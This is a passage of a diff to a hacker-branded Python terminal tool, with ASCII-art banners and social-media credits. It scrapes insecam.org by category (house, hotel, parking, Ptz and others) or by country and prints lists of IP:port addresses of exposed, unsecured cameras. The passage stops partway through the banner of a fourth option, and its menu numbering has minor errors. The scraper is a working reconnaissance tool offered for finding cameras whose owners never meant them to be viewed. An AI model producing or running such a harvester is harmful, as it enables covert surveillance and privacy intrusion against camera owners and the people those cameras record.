+            ⢀⣤⣾⣶⣦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣽⡿⠻⣷⣀⠀⢻⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⣤⣶⣶⣤⣀⣀⣬⣷⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣦⣼⣀⠀
+            ⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⣿⣿⠟⠁⠘⣿⡟⠁⠀⠘⠛⠁⠀⠀⢠⣾⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠙⠁
+            ⠀⠸⠟⠋⠀⠈⠙⣿⣿⣿⣿⣿⣿⣷⣦⡄⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣼⣆⢘⣿⣯⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠉⢱⡿⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡿⠦⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡗⠀⠈⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣉⣿⡿⢿⢷⣾⣾⣿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⠿⠿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣷⣦⣶⣦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣤⡖⠛⠶⠤⡀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠙⣿⣿⠿⢻⣿⣿⡿⠋⢩⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⣤⣦⣤⣄⡀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠘⣧⠀⠈⣹⡻⠇⢀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠈⢽⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣴⣿⣷⢲⣦⣤⡀⢀⡀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠂⠛⣆⣤⡜⣟⠋⠙⠂⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠉⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣆⠀⠰⠄⠀⠉⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠿⠿⣿⣿⣿⠇⠀⠀⢀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⡇⠀⠀⢀⣼⠿⠇⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            {yellow}[!]▪︎ {red}EXIT:{white+bold}CTRL+C
+            {red}𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺
+
+            {green}[<ID~>github] ▪︎  {white}https://github.com/mohammadmahdi-termux
+            {cyan}[<ID~>telegram] ▪︎  {white}@Mohammadmahdi_termux
+            {magenta}[<ID~>instagram] ▪︎  {white}@Mohammadmahditermux
+
+            {red}𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺
+
+                    {yellow}01–{red}server      {yellow}02–{red}farm      {yellow}03–{red}restaurant    
+                    {yellow}04–{red}park        {yellow}05–{red}brid      {yellow}06–{red}beach    
+                    {yellow}07–{red}bridge      {yellow}08–{red}sport     {yellow}09–{red}shop       
+                    {yellow}10–{red}airline     {yellow}11–{red}hotel     {yellow}12–{red}Bar 
+                    {yellow}13–{red}House       {yellow}14–{red}Parking   {yellow}15–{red}Landscape  
+                    {yellow}18–{red}Traffic     {yellow}17–{red}Nature    {yellow}19–{red}Printer
+                    {yellow}19–{red}Religion    {yellow}20–{red}Laundry   {yellow}21–{red}Mountain    
+                    {yellow}22–{red}x           {yellow}23–{red}Ptz       {yellow}24–{red}Energy
+
+            {red}+𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺
+
+            """)
+
+
+
+
+
+            try :
+                type_text(text)
+
+
+                locs = ["Server","Farm","Restaurant","park","bird","beach","bridge","sport","shop","Airliner","hotel","Bar","House","Parking","Landscape","Traffic","Nature","Printer","Religion","Laundry","Mountain","Architecture","Ptz","Energy"]
+
+
+                headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36"}
+                num = int(input(f"{yellow}[?]~>{red}Enter code location : "))
+                if num not in range(1, 24+1):
+                    raise IndexError
+
+                text= ""    
+                loc = locs[num-1]
+                res = requests.get( f"http://www.insecam.org/en/bytag/{loc}",headers=headers )
+                last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]
+                for page in range(int(last_page)):
+                    res = requests.get( f"http://www.insecam.org/en/bytag/{loc}/?page={page}", headers=headers )
+                    find_ip = re.findall("http://\d+.\d+.\d+.\d+:\d+", res.text)
+                    print(f"""\n{bold+yellow}@Mohammadmahdi_termux""")
+                    print(green+"")
+
+                    for ip in find_ip:
+                        print(ip)
+
+            except:
+
+                        print(red+" !ERORR❌ *call me*")
+
+
+        elif choice == 3:
+            clear_terminal()
+            import requests
+            import re
+            import colorama
+            colorama.init()
+            import os
+            import time
+            import sys
+
+
+            green  ="\x1b[1;92m"
+            cyan   ="\x1b[1;96m"
+            yellow ="\x1b[1;93m"
+            magenta   ="\x1b[1;95m"
+            white  ="\x1b[1;97m"
+            blue   ="\x1b[1;94m"
+            red  ='\x1b[1;91m'
+            underline = '\033[4m'
+            pink = '\033[35m'
+            bold = '\033[1m'
+            black='\033[30m'
+
+
+
+            print(f"""{green}
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣄⣠⣀⡀⣀⣠⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⢠⣠⣼⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⢠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣟⣾⣿⣽⣿⣿⣅⠈⠉⠻⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⢀⡶⠒⢉⡀⢠⣤⣶⣶⣿⣷⣆⣀⡀⠀⢲⣖⠒⠀⠀⠀⠀⠀⠀⠀
+            ⢀⣤⣾⣶⣦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣽⡿⠻⣷⣀⠀⢻⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⣤⣶⣶⣤⣀⣀⣬⣷⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣦⣼⣀⠀
+            ⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⣿⣿⠟⠁⠘⣿⡟⠁⠀⠘⠛⠁⠀⠀⢠⣾⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠙⠁
+            ⠀⠸⠟⠋⠀⠈⠙⣿⣿⣿⣿⣿⣿⣷⣦⡄⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣼⣆⢘⣿⣯⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠉⢱⡿⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡿⠦⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡗⠀⠈⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣉⣿⡿⢿⢷⣾⣾⣿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⠿⠿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣷⣦⣶⣦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣤⡖⠛⠶⠤⡀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠙⣿⣿⠿⢻⣿⣿⡿⠋⢩⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⣤⣦⣤⣄⡀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠘⣧⠀⠈⣹⡻⠇⢀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠈⢽⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣴⣿⣷⢲⣦⣤⡀⢀⡀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠂⠛⣆⣤⡜⣟⠋⠙⠂⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠉⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣆⠀⠰⠄⠀⠉⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠿⠿⣿⣿⣿⠇⠀⠀⢀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⡇⠀⠀⢀⣼⠿⠇⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀""")
+            print(f"  {yellow}[!]▪︎ {red}EXIT:{white+bold}CTRL+C")
+
+            def type_text(text):
+                for char in text:
+                    sys.stdout.write(char)
+                    sys.stdout.flush()
+                    time.sleep(0.001) 
+                print()
+
+
+
+            while True:
+                text1=(f"""
+            {red}𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺
+
+            {green}[<ID~>github] ▪︎  {white}https://github.com/mohammadmahdi-termux
+            {cyan}[<ID~>telegram] ▪︎  {white}@Mohammadmahdi_termux
+            {magenta}[<ID~>instagram] ▪︎  {white}@Mohammadmahditermux
+
+            {red}𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺
+
+            {red}01–{yellow}•Albania•            {red}02–{yellow}•Algeria•           {red}03–{yellow}•Andorra•           {red}04–{yellow}•Angola•
+            {red}05–{yellow}•Antigua & Barbuda•  {red}06–{yellow}•Argentina•         {red}07–{yellow}•Armenia•           {red}08–{yellow}•Aruba•
+            {red}09–{yellow}•Australia•          {red}10–{yellow}•Austria•           {red}11–{yellow}•Azerbaijan•        {red}12–{yellow}•The Bahamas•
+            {red}13–{yellow}•Bangladesh•         {red}14–{yellow}•Barbados•          {red}15–{yellow}•Belarus•           {red}16–{yellow}•Belgium•
+            {red}17–{yellow}•Benin•             {red}18–{yellow}•Bosnia and Herzegovina• {red}19–{yellow}•Botswana•      {red}20–{yellow}•Brazil•
+            {red}21–{yellow}•Bulgaria•           {red}22–{yellow}•Cambodia•           {red}23–{yellow}•Canada•            {red}24–{yellow}•Cayman Islands•
+            {red}25–{yellow}•Chile•              {red}26–{yellow}•China•             {red}27–{yellow}•Congo•             {red}28–{yellow}•Costa Rica•
+            {red}29–{yellow}•Côte d'Ivoire•      {red}30–{yellow}•Croatia•           {red}31–{yellow}•Cyprus•            {red}32–{yellow}•Czech Republic•
+            {red}33–{yellow}•Denmark•            {red}34–{yellow}•Egypt•             {red}35–{yellow}•El Salvador•       {red}36–{yellow}•Faeroe Islands•
+            {red}37–{yellow}•Finland•            {red}38–{yellow}•France•            {red}39–{yellow}•Gabon•             {red}40–{yellow}•Georgia•
+            {red}41–{yellow}•Germany•            {red}42–{yellow}•Gibraltar•         {red}43–{yellow}•Greece•            {red}44–{yellow}•Guadeloupe•
+            {red}45–{yellow}•Guam•               {red}46–{yellow}•Guatemala•         {red}47–{yellow}•Guyana•            {red}48–{yellow}•Honduras•
+            {red}49–{yellow}•Hong Kong•          {red}50–{yellow}•Hungary•           {red}51–{yellow}•India•             {red}52–{yellow}•Indonesia•
+            {red}53–{yellow}•Iran•               {red}54–{yellow}•Ireland•           {red}55–{yellow}•Israel•            {red}56–{yellow}•Italy•
+            {red}57–{yellow}•Jamaica•            {red}58–{yellow}•Japan•             {red}59–{yellow}•Jordan•            {red}60–{yellow}•Kazakhstan•
+            {red}61–{yellow}•Kenya•              {red}62–{yellow}•Kuwait•            {red}63–{yellow}•Laos•              {red}64–{yellow}•Lebanon•
+            {red}65–{yellow}•Liechtenstein•      {red}66–{yellow}•Luxembourg•        {red}67–{yellow}•Macau•             {red}68–{yellow}•Macedonia•
+            {red}69–{yellow}•Madagascar•         {red}70–{yellow}•Malaysia•          {red}71–{yellow}•Malta•             {red}72–{yellow}•Martinique•
+            {red}73–{yellow}•Mauritius•          {red}74–{yellow}•Mexico•            {red}75–{yellow}•Moldova•           {red}76–{yellow}•Mongolia•
+            {red}77–{yellow}•Morocco•            {red}78–{yellow}•Namibia•           {red}79–{yellow}•Nepal•             {red}80–{yellow}•Netherlands•
+            {red}81–{yellow}•New Caledonia•      {red}82–{yellow}•New Zealand•       {red}83–{yellow}•Nicaragua•         {red}84–{yellow}•Nigeria•
+            {red}85–{yellow}•Norway•             {red}86–{yellow}•Pakistan•          {red}87–{yellow}•Panama•            {red}88–{yellow}•Paraguay•
+            {red}89–{yellow}•Peru•               {red}90–{yellow}•Philippines•       {red}91–{yellow}•Poland•            {red}92–{yellow}•Portugal•
+            {red}93–{yellow}•Puerto Rico•        {red}94–{yellow}•Qatar•            {red}95–{yellow}•Réunion•           {red}96–{yellow}•Romania•
+            {red}97–{yellow}•Russia•             {red}98–{yellow}•Saint Kitts & Nevis• {red}99–{yellow}•Saint Vincent•   {red}100–{yellow}•São Tomé•
+            {red}101–{yellow}•Saudi Arabia•       {red}102–{yellow}•Senegal•         {red}103–{yellow}•Slovakia•         {red}104–{yellow}•South Africa•
+            {red}105–{yellow}•South Korea•       {red}106–{yellow}•Spain•           {red}107–{yellow}•Sri Lanka•        {red}108–{yellow}•Sudan•
+            {red}109–{yellow}•Suriname•          {red}110–{yellow}•Sweden•          {red}111–{yellow}•Switzerland•      {red}112–{yellow}•Syria•
+            {red}113–{yellow}•Taiwan•            {red}114–{yellow}•Tanzania•        {red}115–{yellow}•Thailand•         {red}116–{yellow}•Trinidad and Tobago•
+            {red}117–{yellow}•Tunisia•           {red}118–{yellow}•Turkey•          {red}119–{yellow}•U-A-Emirates•     {red}120–{yellow}•Uganda•
+            {red}121–{yellow}•Ukraine•           {red}122–{yellow}•United Kingdom•  {red}123–{yellow}•United States•    {red}124–{yellow}•Uruguay•
+            {red}125–{yellow}•Uzbekistan•        {red}126–{yellow}•Vietnam•
+
+            {red}+𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺𝄺""")
+                break
+                # Corresponding country codes in alphabetical order
+            gamer="human"
+            try :
+                type_text(text1)
+                countries = ["AL","DZ","AD","AO", "AG", "AR", "AM", "AW", "AU", "AT", "AZ", "BS", "BD", "BB", 
+                    "BY", "BE", "BJ", "BA", "BW", "BR", "BG", "KH", "CA", "KY", "CL", "CN", "CG", "CR", 
+                    "CI", "HR", "CY", "CZ", "DK", "EG", "SV", "FO", "FI", "FR", "GA", "GE", "DE", "GI", 
+                    "GR", "GP", "GU", "GT", "GY", "HN", "HK", "HU", "IN", "ID", "IR", "IE", "IL", "IT", 
+                    "JM", "JP", "JO", "KZ", "KE", "KW", "LA", "LB", "LI", "LU", "MO", "MK", "MG", "MY", 
+                    "MT", "MQ", "MU", "MX", "MD", "MN", "MA", "NA", "NP", "NL", "NC", "NZ", "NI", "NG", 
+                    "NO", "PK", "PA", "PY", "PE", "PH", "PL", "PT", "PR", "QA", "RE", "RO", "RU", "KN", 
+                    "VC", "ST", "SA", "SN", "SK", "ZA", "KR", "ES", "LK", "SD", "SR", "SE", "CH", "SY", 
+                    "TW", "TZ", "TH", "TT", "TN", "TR", "AE", "UG", "UA", "GB", "US", "UY", "UZ", "VN"]
+
+
+                headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36"}
+                num = int(input(f"{yellow}[?]~>{red}Enter code country : "))
+                if num not in range(1,128):
+                    raise IndexError
+
+                text=""
+                country = countries[num-1]
+                res = requests.get( f"http://www.insecam.org/en/bycountry/{country}",headers=headers )
+                last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]
+                for page in range(int(last_page)):
+                    res = requests.get( f"http://www.insecam.org/en/bycountry/{country}/?page={page}", headers=headers )
+                    find_ip = re.findall("http://\d+.\d+.\d+.\d+:\d+", res.text)
+                    print(f"""\n{bold+yellow}@Mohammadmahdi_termux""")
+                    print(green+"")
+
+                    for ip in find_ip:
+                        print(ip)
+
+
+
+            except:
+
+                        print(red+" !ERORR❌ ")
+
+
+        elif choice == 4:
+            clear_terminal()
+            import requests
+            import re
+            import colorama
+            colorama.init()
+            import os
+            import sys
+            import time
+            green  ="\x1b[1;92m"
+            cyan   ="\x1b[1;96m"
+            yellow ="\x1b[1;93m"
+            magenta   ="\x1b[1;95m"
+            white  ="\x1b[1;97m"
+            blue   ="\x1b[1;94m"
+            red  ='\x1b[1;91m'
+            underline = '\033[4m'
+            pink = '\033[35m'
+            bold = '\033[1m'
+            black='\033[30m'
+
+
+            def type_text(text):
+                for char in text:
+                    sys.stdout.write(char)
+                    sys.stdout.flush()
+                    time.sleep(0.001)
+                print()                  
+            text = (f"""{green}
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣄⣠⣀⡀⣀⣠⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⢠⣠⣼⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⢠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+            ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣟⣾⣿⣽⣿⣿⣅⠈⠉⠻⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⢀⡶⠒⢉⡀⢠⣤⣶⣶⣿⣷⣆⣀⡀⠀⢲⣖⠒⠀⠀⠀⠀⠀⠀⠀
+            ⢀⣤⣾⣶⣦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣽⡿⠻⣷⣀⠀⢻⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⣤⣶⣶⣤⣀⣀⣬⣷⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣦⣼⣀⠀
